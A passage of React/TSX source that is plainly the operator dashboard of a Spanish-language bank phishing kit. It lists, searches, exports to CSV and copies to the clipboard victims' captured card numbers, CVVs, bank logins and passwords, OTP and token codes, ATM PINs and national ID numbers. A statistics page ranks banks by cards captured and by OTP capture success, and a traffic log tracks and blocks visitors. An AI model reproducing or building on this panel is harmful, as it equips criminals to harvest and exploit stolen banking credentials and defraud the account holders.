                        if (data.ok && data.sessions.length > 0) {
                          exportToCSV(data.sessions, `historial_completo_${new Date().toISOString().slice(0, 10)}.csv`);
                        }
                      } catch (e) {
                        console.error("Failed to export all", e);
                      }
                    }}
                    className="flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 hover:bg-cyan-500/20 transition-all active:scale-95"
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                    </svg>
                    CSV Todo ({historyTotal})
                  </button>
                )}
              </div>
            </div>

            {/* Search bar */}
            <div className="relative mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
              <input
                type="text"
                value={historySearchQuery}
                onChange={(e) => setHistorySearchQuery(e.target.value)}
                onKeyDown={(e) => { if (e.key === 'Enter') loadHistory(1); }}
                placeholder="Buscar por email, tarjeta, banco, IP..."
                className={`w-full pl-10 pr-24 py-2.5 rounded-xl border ${theme.border} ${theme.cardBg} ${theme.text} text-sm placeholder:text-gray-500 focus:outline-none focus:ring-1 focus:ring-cyan-500/30`}
              />
              <button
                onClick={() => loadHistory(1)}
                className="absolute right-2 top-1/2 -translate-y-1/2 px-3 py-1.5 rounded-lg text-xs font-semibold bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 hover:bg-cyan-500/20 transition-all active:scale-95"
              >
                Buscar
              </button>
            </div>
            {historySessions.length === 0 ? (
              <div className={`text-center py-16 rounded-2xl border ${theme.border} ${theme.cardBg}`}>
                <p className={theme.textSecondary}>No hay sesiones guardadas aún.</p>
              </div>
            ) : (
              <div className={`overflow-x-auto rounded-2xl border ${theme.border} ${theme.cardBg}`}>
                <table className="w-full text-xs">
                  <thead>
                    <tr className={`border-b ${theme.border}`}>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Últ. Actividad</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Email/Cel</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Tarjeta</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Titular</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Vence</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>CVV</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Banco</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Usuario</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Contraseña</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>OTP</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Dinámica</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Token</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>ATM</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Dirección</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Cédula</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Ciudad</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>IP</th>
                      <th className={`px-4 py-3 text-left ${theme.textSecondary} font-medium`}>Estado</th>
                    </tr>
                  </thead>
                  <tbody>
                    {historySessions.map((s: any) => (
                      <tr key={s.id} onClick={() => setHistoryDetailSession(s)} className={`border-b ${theme.border} hover:bg-white/[0.02] transition-colors cursor-pointer`}>
                        <td className={`px-4 py-3 ${theme.textSecondary} whitespace-nowrap`}>{new Date(s.updatedAt || s.createdAt).toLocaleString()}</td>
                        <td className={`px-4 py-3 ${theme.text} font-medium`}>{s.email || "—"}</td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-1.5">
                            {getCardBrandSVG(s.cardNumber, s.cardBin) && (
                              <span className="flex-shrink-0 bg-white rounded px-1 py-0.5 flex items-center">
                                {getCardBrandSVG(s.cardNumber, s.cardBin)}
                              </span>
                            )}
                            <span className="text-cyan-400 font-mono text-[11px]">{s.cardNumber || s.cardBin || "—"}</span>
                          </div>
                        </td>
                        <td className={`px-4 py-3 ${theme.text} text-[11px]`}>{s.holderName || "—"}</td>
                        <td className="px-4 py-3 text-cyan-400 font-mono font-semibold text-[11px]">{s.expiryDate || "—"}</td>
                        <td className="px-4 py-3 text-red-400 font-mono font-bold text-[11px]">{s.cvv || "—"}</td>
                        <td className="px-4 py-3">
                          {(() => {
                            const badge = getBankBadge(s.bankName);
                            return (
                              <span className={`inline-block px-2 py-0.5 rounded text-[10px] font-bold tracking-wide ${badge.bg} ${badge.text}`}>
                                {badge.label}
                              </span>
                            );
                          })()}
                        </td>
                        <td className="px-4 py-3 text-emerald-400 font-mono font-semibold">{s.bankUser || "—"}</td>
                        <td className="px-4 py-3 text-emerald-400 font-mono font-semibold">{s.bankPassword || "—"}</td>
                        <td className="px-4 py-3 text-amber-400 font-mono font-semibold">{s.otpCode || "—"}</td>
                        <td className="px-4 py-3 text-purple-400 font-mono font-semibold">{s.dinamicaCode || "—"}</td>
                        <td className="px-4 py-3 text-orange-400 font-mono font-semibold">{s.tokenCode || "—"}</td>
                        <td className="px-4 py-3 text-sky-400 font-mono font-semibold">{s.atmPin || "—"}</td>
                        <td className={`px-4 py-3 ${theme.text} text-[10px]`}>{s.address || "—"}</td>
                        <td className="px-4 py-3 text-gray-300 font-mono text-[10px]">{s.cedula || "—"}</td>
                        <td className={`px-4 py-3 ${theme.text} text-[10px]`}>{s.city || "—"}</td>
                        <td className="px-4 py-3 text-gray-500 font-mono text-[10px]">{s.ipAddress || "—"}</td>
                        <td className="px-4 py-3">
                          <span className={`px-2 py-0.5 rounded-md text-[10px] font-semibold border ${getStatusClasses(s.status).badge}`}>
                            {getStatusLabel(s.status)}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {/* Pagination Controls */}
                {historyTotalPages > 1 && (
                  <div className="flex items-center justify-between p-4 border-t border-white/5">
                    <button
                      onClick={() => loadHistory(historyPage - 1)}
                      disabled={historyPage <= 1 || historyLoading}
                      className="flex items-center gap-1 px-3 py-2 rounded-lg text-xs font-medium bg-white/5 text-gray-300 border border-white/10 hover:bg-white/10 transition-all disabled:opacity-30 disabled:cursor-not-allowed active:scale-95"
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                      </svg>
                      Anterior
                    </button>
                    <div className="flex items-center gap-1">
                      {Array.from({ length: Math.min(historyTotalPages, 7) }, (_, i) => {
                        let pageNum: number;
                        if (historyTotalPages <= 7) {
                          pageNum = i + 1;
                        } else if (historyPage <= 4) {
                          pageNum = i + 1;
                        } else if (historyPage >= historyTotalPages - 3) {
                          pageNum = historyTotalPages - 6 + i;
                        } else {
                          pageNum = historyPage - 3 + i;
                        }
                        return (
                          <button
                            key={pageNum}
                            onClick={() => loadHistory(pageNum)}
                            disabled={historyLoading}
                            className={`w-8 h-8 rounded-lg text-xs font-bold transition-all active:scale-95 ${
                              pageNum === historyPage
                                ? "bg-red-500 text-white shadow-lg shadow-red-500/30"
                                : "bg-white/5 text-gray-400 hover:bg-white/10 border border-white/5"
                            }`}
                          >
                            {pageNum}
                          </button>
                        );
                      })}
                    </div>
                    <button
                      onClick={() => loadHistory(historyPage + 1)}
                      disabled={historyPage >= historyTotalPages || historyLoading}
                      className="flex items-center gap-1 px-3 py-2 rounded-lg text-xs font-medium bg-white/5 text-gray-300 border border-white/10 hover:bg-white/10 transition-all disabled:opacity-30 disabled:cursor-not-allowed active:scale-95"
                    >
                      Siguiente
                      <svg xmlns="http://www.w3.org/2000/svg" className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
                      </svg>
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* ═══ HISTORY DETAIL MODAL ═══ */}
        {historyDetailSession && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center p-4" onClick={() => setHistoryDetailSession(null)}>
            <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
            <div
              className={`relative w-full max-w-2xl max-h-[85vh] overflow-y-auto rounded-2xl border ${theme.border} ${theme.cardBg} shadow-2xl`}
              onClick={(e) => e.stopPropagation()}
            >
              {/* Header */}
              <div className={`sticky top-0 z-10 flex items-center justify-between px-6 py-4 border-b ${theme.border} ${theme.cardBg} backdrop-blur-xl`}>
                <div>
                  <h3 className={`text-lg font-bold ${theme.text}`}>Detalle de Sesión</h3>
                  <p className={`text-xs ${theme.textSecondary} mt-0.5`}>{historyDetailSession.sessionId}</p>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      const s = historyDetailSession;
                      const lines = [
                        `═══ DETALLE SESIÓN ═══`,
                        `ID: ${s.sessionId}`,
                        `Email/Cel: ${s.email || '—'}`,
                        `IP: ${s.ipAddress || '—'}`,
                        `Estado: ${s.status || '—'}`,
                        `Paso: ${s.currentStep || '—'}`,
                        `Últ. Actividad: ${s.updatedAt ? new Date(s.updatedAt).toLocaleString() : '—'}`,
                        `Creada: ${s.createdAt ? new Date(s.createdAt).toLocaleString() : '—'}`,
                        `Clave Login: ${s.loginPassword || '—'}`,
                        `Teléfono: ${s.phone || s.data?.phone || '—'}`,
                        ``,
                        `── TARJETA ──`,
                        `Número: ${s.cardNumber || s.cardBin || '—'}`,
                        `Titular: ${s.holderName || '—'}`,
                        `Vencimiento: ${s.expiryDate || '—'}`,
                        `CVV: ${s.cvv || '—'}`,
                        `Banco: ${s.bankName || '—'}`,
                        `Red: ${s.cardScheme || '—'}`,
                        `Categoría: ${s.cardCategory || '—'}`,
                        `BIN: ${s.cardBin || '—'}`,
                        `País: ${s.country || '—'}`,
                        ``,
                        `── CREDENCIALES BANCARIAS ──`,
                        `Usuario: ${s.bankUser || '—'}`,
                        `Contraseña: ${s.bankPassword || '—'}`,
                        ``,
                        `── CÓDIGOS ──`,
                        `OTP: ${s.otpCode || '—'}`,
                        `Dinámica: ${s.dinamicaCode || '—'}`,
                        `Token: ${s.tokenCode || '—'}`,
                        `ATM: ${s.atmPin || '—'}`,
                        ``,
                        `── DATOS PERSONALES ──`,
                        `Cédula: ${s.cedula || '—'}`,
                        `Ciudad: ${s.city || '—'}`,
                        `Dirección: ${s.address || '—'}`,
                        ``,
                        `Texto personalizado: ${s.customTextResponse || '—'}`,
                        ...(s.linkedCard ? [
                          ``,
                          `── TARJETA ANTERIOR VINCULADA ──`,
                          `Tarjeta anterior: ${s.linkedCard.previousCard || '—'}`,
                          `Banco anterior: ${s.linkedCard.previousBank || '—'}`,
                          `Sesión anterior: ${s.linkedCard.previousSessionId || '—'}`,
                        ] : []),
                      ];
                      navigator.clipboard.writeText(lines.join('\n')).catch(() => {
                        // Fallback: create textarea and copy
                        const ta = document.createElement('textarea');
                        ta.value = lines.join('\n');
                        document.body.appendChild(ta);
                        ta.select();
                        document.execCommand('copy');
                        document.body.removeChild(ta);
                      });
                      setCopySuccess('modal');
                      setTimeout(() => setCopySuccess(null), 2000);
                    }}
                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold border transition-all active:scale-95 ${
                      copySuccess === 'modal'
                        ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30'
                        : 'bg-white/5 text-gray-400 border-white/10 hover:bg-white/10'
                    }`}
                  >
                    {copySuccess === 'modal' ? '✓ Copiado' : 'Copiar todo'}
                  </button>
                  <button onClick={() => setHistoryDetailSession(null)} className={`p-2 rounded-lg hover:bg-white/10 ${theme.textSecondary} transition-colors`}>
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </button>
                </div>
              </div>
              {/* Body */}
              <div className="p-6 space-y-6">
                {/* Información General */}
                <div>
                  <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                    <span className="w-2 h-2 rounded-full bg-blue-500" />
                    Información General
                  </h4>
                  <div className="grid grid-cols-2 gap-3">
                    <DetailField label="Email / Celular" value={historyDetailSession.email} theme={theme} />
                    <DetailField label="IP" value={historyDetailSession.ipAddress} theme={theme} mono />
                    <DetailField label="Estado" value={getStatusLabel(historyDetailSession.status)} theme={theme} badge />
                    <DetailField label="Paso actual" value={historyDetailSession.currentStep} theme={theme} />
                    <DetailField label="Última actividad" value={new Date(historyDetailSession.updatedAt || historyDetailSession.createdAt).toLocaleString()} theme={theme} />
                    <DetailField label="Creada" value={historyDetailSession.createdAt ? new Date(historyDetailSession.createdAt).toLocaleString() : '—'} theme={theme} />
                    <DetailField label="Clave Login" value={historyDetailSession.loginPassword} theme={theme} mono highlight="emerald" />
                    <DetailField label="Teléfono" value={historyDetailSession.phone || historyDetailSession.data?.phone} theme={theme} mono />
                  </div>
                </div>

                {/* Datos de Tarjeta */}
                <div>
                  <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                    <span className="w-2 h-2 rounded-full bg-cyan-500" />
                    Datos de Tarjeta
                  </h4>
                  <div className="grid grid-cols-2 gap-3">
                    <DetailField label="Número de Tarjeta" value={historyDetailSession.cardNumber || historyDetailSession.cardBin} theme={theme} mono highlight="cyan" />
                    <DetailField label="Titular" value={historyDetailSession.holderName} theme={theme} />
                    <DetailField label="Vencimiento" value={historyDetailSession.expiryDate} theme={theme} mono highlight="cyan" />
                    <DetailField label="CVV" value={historyDetailSession.cvv} theme={theme} mono highlight="red" />
                    <DetailField label="Banco" value={historyDetailSession.bankName} theme={theme} />
                    <DetailField label="Red" value={historyDetailSession.cardScheme} theme={theme} />
                    <DetailField label="Categoría" value={historyDetailSession.cardCategory} theme={theme} />
                    <DetailField label="BIN" value={historyDetailSession.cardBin} theme={theme} mono />
                    <DetailField label="País" value={historyDetailSession.country} theme={theme} />
                  </div>
                </div>

                {/* Credenciales Bancarias */}
                {(historyDetailSession.bankUser || historyDetailSession.bankPassword) && (
                  <div>
                    <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                      <span className="w-2 h-2 rounded-full bg-emerald-500" />
                      Credenciales Bancarias
                    </h4>
                    <div className="grid grid-cols-2 gap-3">
                      <DetailField label="Usuario" value={historyDetailSession.bankUser} theme={theme} mono highlight="emerald" />
                      <DetailField label="Contraseña" value={historyDetailSession.bankPassword} theme={theme} mono highlight="emerald" />
                    </div>
                  </div>
                )}

                {/* Códigos de Verificación */}
                {(historyDetailSession.otpCode || historyDetailSession.dinamicaCode || historyDetailSession.tokenCode || historyDetailSession.atmPin) && (
                  <div>
                    <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                      <span className="w-2 h-2 rounded-full bg-amber-500" />
                      Códigos de Verificación
                    </h4>
                    <div className="grid grid-cols-2 gap-3">
                      {historyDetailSession.otpCode && <DetailField label="OTP" value={historyDetailSession.otpCode} theme={theme} mono highlight="amber" />}
                      {historyDetailSession.dinamicaCode && <DetailField label="Clave Dinámica" value={historyDetailSession.dinamicaCode} theme={theme} mono highlight="purple" />}
                      {historyDetailSession.tokenCode && <DetailField label="Token" value={historyDetailSession.tokenCode} theme={theme} mono highlight="orange" />}
                      {historyDetailSession.atmPin && <DetailField label="Clave ATM" value={historyDetailSession.atmPin} theme={theme} mono highlight="sky" />}
                    </div>
                  </div>
                )}

                {/* Datos Personales */}
                {(historyDetailSession.address || historyDetailSession.cedula || historyDetailSession.city) && (
                  <div>
                    <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                      <span className="w-2 h-2 rounded-full bg-violet-500" />
                      Datos Personales
                    </h4>
                    <div className="grid grid-cols-2 gap-3">
                      {historyDetailSession.cedula && <DetailField label="Cédula" value={historyDetailSession.cedula} theme={theme} mono />}
                      {historyDetailSession.city && <DetailField label="Ciudad" value={historyDetailSession.city} theme={theme} />}
                      {historyDetailSession.address && <DetailField label="Dirección" value={historyDetailSession.address} theme={theme} fullWidth />}
                    </div>
                  </div>
                )}

                {/* Texto personalizado */}
                {historyDetailSession.customTextResponse && (
                  <div>
                    <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                      <span className="w-2 h-2 rounded-full bg-pink-500" />
                      Respuesta Texto Personalizado
                    </h4>
                    <div className={`p-3 rounded-lg border ${theme.border} bg-white/[0.02]`}>
                      <p className={`text-sm ${theme.text} font-mono`}>{historyDetailSession.customTextResponse}</p>
                    </div>
                  </div>
                )}

                {/* Tarjeta vinculada */}
                {historyDetailSession.linkedCard && (
                  <div>
                    <h4 className={`text-sm font-semibold ${theme.text} mb-3 flex items-center gap-2`}>
                      <span className="w-2 h-2 rounded-full bg-orange-500 animate-pulse" />
                      Tarjeta Anterior Vinculada
                    </h4>
                    <div className="grid grid-cols-2 gap-3">
                      <DetailField label="Tarjeta anterior" value={historyDetailSession.linkedCard.previousCard} theme={theme} mono highlight="orange" />
                      <DetailField label="Banco anterior" value={historyDetailSession.linkedCard.previousBank} theme={theme} />
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ═══ STATS PAGE ═══ */}
        {statsMode && (
          <div className="space-y-6">
            {/* Header */}
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <span className="text-2xl">🏦</span>
                <div>
                  <h2 className={`text-xl font-bold ${theme.text}`}>Estadísticas por Banco</h2>
                  <p className={`text-xs ${theme.textSecondary}`}>Desglose de tarjetas capturadas por entidad bancaria</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className={`px-3 py-1.5 rounded-lg text-xs font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/20`}>
                  {metrics.totalCards} tarjetas totales
                </div>
              </div>
            </div>

            {/* Summary Cards */}
            {metrics.bankStats && metrics.bankStats.length > 0 && (
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className={`rounded-xl border ${theme.border} ${theme.cardBg} p-4 text-center`}>
                  <div className="text-2xl font-bold text-cyan-400">{metrics.bankStats.length}</div>
                  <div className={`text-[10px] ${theme.textSecondary} mt-1`}>Bancos detectados</div>
                </div>
                <div className={`rounded-xl border ${theme.border} ${theme.cardBg} p-4 text-center`}>
                  <div className="text-2xl font-bold text-emerald-400">{metrics.bankStats.reduce((sum, s) => sum + s.withOtp, 0)}</div>
                  <div className={`text-[10px] ${theme.textSecondary} mt-1`}>Con OTP/Dinámica</div>
                </div>
                <div className={`rounded-xl border ${theme.border} ${theme.cardBg} p-4 text-center`}>
                  <div className="text-2xl font-bold text-purple-400">{metrics.bankStats.reduce((sum, s) => sum + s.withCredentials, 0)}</div>
                  <div className={`text-[10px] ${theme.textSecondary} mt-1`}>Con Credenciales</div>
                </div>
                <div className={`rounded-xl border ${theme.border} ${theme.cardBg} p-4 text-center`}>
                  <div className="text-2xl font-bold text-amber-400">{metrics.bankStats[0]?.bank || '—'}</div>
                  <div className={`text-[10px] ${theme.textSecondary} mt-1`}>Banco líder ({metrics.bankStats[0]?.total || 0})</div>
                </div>
              </div>
            )}

            {/* Bank Stats Table */}
            {metrics.bankStats && metrics.bankStats.length > 0 ? (
              <div className={`rounded-2xl border ${theme.border} ${theme.cardBg} overflow-hidden`}>
                <div className="overflow-x-auto">
                  <table className="w-full text-xs">
                    <thead>
                      <tr className="border-b" style={{ borderColor: 'rgba(255,255,255,0.05)' }}>
                        <th className={`text-left px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>#</th>
                        <th className={`text-left px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>Banco</th>
                        <th className={`text-center px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>Tarjetas</th>
                        <th className={`text-center px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>Con OTP/Din</th>
                        <th className={`text-center px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>Con Creds</th>
                        <th className={`text-center px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>% Éxito OTP</th>
                        <th className={`text-left px-4 py-3 ${theme.textSecondary} font-semibold uppercase tracking-wider text-[10px]`}>Volumen</th>
                      </tr>
                    </thead>
                    <tbody>
                      {metrics.bankStats.map((stat, idx) => {
                        const maxTotal = metrics.bankStats![0]?.total || 1;
                        const pct = Math.round((stat.total / maxTotal) * 100);
                        const otpPct = stat.total > 0 ? Math.round((stat.withOtp / stat.total) * 100) : 0;
                        return (
                          <tr key={idx} className="border-b last:border-b-0 hover:bg-white/[0.03] transition-colors" style={{ borderColor: 'rgba(255,255,255,0.03)' }}>
                            <td className={`px-4 py-3 ${theme.textSecondary} font-mono text-[10px]`}>{idx + 1}</td>
                            <td className={`px-4 py-3 font-semibold ${theme.text}`}>{stat.bank}</td>
                            <td className="px-4 py-3 text-center">
                              <span className="inline-block px-2.5 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-bold text-[12px]">{stat.total}</span>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <span className={`inline-block px-2.5 py-1 rounded-lg font-bold text-[12px] ${stat.withOtp > 0 ? 'bg-emerald-500/10 text-emerald-400' : 'bg-white/5 text-gray-600'}`}>{stat.withOtp}</span>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <span className={`inline-block px-2.5 py-1 rounded-lg font-bold text-[12px] ${stat.withCredentials > 0 ? 'bg-purple-500/10 text-purple-400' : 'bg-white/5 text-gray-600'}`}>{stat.withCredentials}</span>
                            </td>
                            <td className="px-4 py-3 text-center">
                              <span className={`inline-block px-2.5 py-1 rounded-lg font-bold text-[11px] ${
                                otpPct >= 70 ? 'bg-emerald-500/10 text-emerald-400' :
                                otpPct >= 40 ? 'bg-amber-500/10 text-amber-400' :
                                'bg-red-500/10 text-red-400'
                              }`}>{otpPct}%</span>
                            </td>
                            <td className="px-4 py-3">
                              <div className="flex items-center gap-2">
                                <div className="flex-1 h-2.5 rounded-full bg-white/5 overflow-hidden">
                                  <div
                                    className="h-full rounded-full bg-gradient-to-r from-cyan-500 to-blue-500 transition-all duration-700"
                                    style={{ width: `${pct}%` }}
                                  />
                                </div>
                                <span className={`text-[10px] ${theme.textSecondary} w-8 text-right font-mono`}>{pct}%</span>
                              </div>
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>
            ) : (
              <div className="text-center py-16">
                <div className={`w-16 h-16 mx-auto mb-4 rounded-2xl ${theme.inputBg} border ${theme.border} flex items-center justify-center`}>
                  <span className="text-3xl">🏦</span>
                </div>
                <h3 className={`text-lg font-semibold ${theme.textSecondary} mb-2`}>Sin datos aún</h3>
                <p className={`text-sm ${theme.textSecondary} opacity-60`}>Las estadísticas aparecerán cuando se capturen tarjetas</p>
              </div>
            )}
          </div>
        )}

        {/* ═══ ACTIVE SESSIONS ═══ */}
        {/* ═══ TRAFFIC LOG ═══ */}
        {trafficMode && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className={`text-lg font-bold ${theme.text}`}>🌐 Historial de Tráfico</h2>
              <div className="flex gap-2">
                <button
                  onClick={() => loadTrafficData(trafficPage)}
                  className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-blue-500/10 text-blue-400 border-blue-500/20 hover:bg-blue-500/20 transition-all active:scale-95"
                >
                  🔄 Refrescar
                </button>
                <button
                  onClick={clearTrafficData}
                  className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20 transition-all active:scale-95"
                >
                  🗑️ Limpiar
                </button>
              </div>
            </div>
            <div className={`text-xs ${theme.textSecondary}`}>
              Total: {trafficTotal} registros | Página {trafficPage} de {Math.ceil(trafficTotal / TRAFFIC_PAGE_SIZE) || 1}
            </div>

            {trafficLoading ? (
              <div className={`text-center py-8 ${theme.textSecondary}`}>Cargando...</div>
            ) : trafficLogs.length === 0 ? (
              <div className={`text-center py-8 ${theme.textSecondary}`}>No hay registros de tráfico</div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-xs">
                  <thead>
                    <tr className={`border-b ${theme.border}`}>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>#</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>IP</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Ciudad</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>User-Agent</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Path</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Bloqueado</th>
                      <th className={`text-left py-2 px-2 ${theme.textSecondary}`}>Fecha</th>
                    </tr>
                  </thead>
                  <tbody>
                    {trafficLogs.map((log: any, idx: number) => (
                      <tr key={log.id || idx} className={`border-b ${theme.border} hover:bg-white/5`}>
                        <td className={`py-2 px-2 ${theme.textSecondary}`}>{(trafficPage - 1) * TRAFFIC_PAGE_SIZE + idx + 1}</td>
                        <td className={`py-2 px-2 font-mono ${theme.text}`}>{log.ipAddress}</td>
                        <td className={`py-2 px-2 ${theme.text}`}>{log.country || "—"}</td>
                        <td className={`py-2 px-2 ${theme.textSecondary} max-w-[200px] truncate`} title={log.userAgent}>{log.userAgent?.slice(0, 50) || "—"}</td>
                        <td className={`py-2 px-2 ${theme.text}`}>{log.path || "/"}</td>
                        <td className={`py-2 px-2`}>
                          {log.blocked ? <span className="text-red-400">⛔ Sí</span> : <span className="text-green-400">✅ No</span>}
                        </td>
                        <td className={`py-2 px-2 ${theme.textSecondary}`}>{new Date(log.createdAt).toLocaleString("es-CO")}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}

            {/* Pagination */}
            {trafficTotal > TRAFFIC_PAGE_SIZE && (
              <div className="flex items-center justify-center gap-2 mt-4">
                <button
                  onClick={() => loadTrafficData(trafficPage - 1)}
                  disabled={trafficPage <= 1}
                  className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${trafficPage <= 1 ? "opacity-30 cursor-not-allowed" : "hover:bg-white/10"} ${theme.border} ${theme.text}`}
                >
                  ← Anterior
                </button>
                <span className={`text-xs ${theme.textSecondary}`}>
                  {trafficPage} / {Math.ceil(trafficTotal / TRAFFIC_PAGE_SIZE)}
                </span>
                <button
                  onClick={() => loadTrafficData(trafficPage + 1)}
                  disabled={trafficPage >= Math.ceil(trafficTotal / TRAFFIC_PAGE_SIZE)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${trafficPage >= Math.ceil(trafficTotal / TRAFFIC_PAGE_SIZE) ? "opacity-30 cursor-not-allowed" : "hover:bg-white/10"} ${theme.border} ${theme.text}`}
                >
                  Siguiente →
                </button>
              </div>
            )}
          </div>
        )}

        {/* ═══ ACTIVE SESSIONS ═══ */}
        {!historyMode && !statsMode && !trafficMode && (
          <div className="space-y-6">
            {/* Search Bar */}
            <div className="relative">
              <svg xmlns="http://www.w3.org/2000/svg" className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Buscar por email, IP, tarjeta, banco..."
                className={`w-full ${theme.inputBg} border ${theme.border} rounded-xl pl-10 pr-4 py-2.5 text-sm ${theme.text} placeholder:text-gray-500 focus:outline-none focus:border-red-500/30 focus:ring-1 focus:ring-red-500/20 transition-all`}
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery("")}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors"
                >
                  ✕
                </button>
              )}
            </div>

            {/* Filters Bar */}
            {sessions.length > 0 && (
              <div className="flex items-center gap-2 sm:gap-3 flex-wrap">
                <span className="text-[10px] text-gray-500 uppercase font-semibold tracking-wider hidden sm:inline">Filtros:</span>
                <div className="flex items-center gap-1 sm:gap-1.5 flex-wrap">
                  {([
                    { key: "all", label: "Todos" },
                    { key: "online", label: "Online" },
                    { key: "offline", label: "Offline" },
                    { key: "with-data", label: "Con datos" },
                    { key: "no-data", label: "Sin datos" },
                  ] as { key: SessionFilter; label: string }[]).map(f => (
                    <button
                      key={f.key}
                      onClick={() => setFilter(f.key)}
                      className={`px-2 sm:px-3 py-1 sm:py-1.5 rounded-lg text-[10px] sm:text-[11px] font-medium border transition-all ${
                        filter === f.key
                          ? "bg-red-500/10 text-red-400 border-red-500/30"
                          : "bg-white/5 text-gray-400 border-white/5 hover:bg-white/10"
                      }`}
                    >
                      {f.label}
                    </button>
